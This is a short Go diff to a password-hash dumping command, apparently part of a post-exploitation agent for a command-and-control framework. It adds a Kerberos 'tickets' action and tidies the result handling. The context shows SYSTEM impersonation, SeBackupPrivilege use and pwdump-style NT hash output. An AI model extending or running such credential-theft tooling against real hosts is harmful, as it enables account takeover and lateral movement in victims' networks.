@@ -75,6 +75,9 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 	if args.Action == "insitu-full" {
 		return executeInsituFull()
 	}
+	if args.Action == "tickets" {
+		return executeKerbTickets()
+	}
 
 	// Enable SeBackupPrivilege on both process and thread tokens
 	// Thread token is needed when impersonating SYSTEM via getsystem
@@ -116,11 +119,7 @@ func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult 
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // regOpenKey opens a registry key using the Go stdlib windows.RegOpenKeyEx.
